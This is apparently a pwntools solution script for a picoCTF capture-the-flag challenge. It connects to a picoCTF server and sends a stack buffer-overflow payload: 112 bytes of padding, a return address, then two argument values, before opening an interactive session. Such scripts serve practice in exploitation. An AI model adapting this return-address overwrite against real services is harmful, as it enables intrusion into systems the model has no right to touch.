from pwn import *

context.update(arch='i386', os='linux')
PORT = "50790"
SERVER = "saturn.picoctf.net" 

p = remote(SERVER, PORT)

payload = b"a"*112
payload += p32(0x08049296)
payload += b"a"*4
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)

p.sendlineafter("string:", payload)
p.interactive()

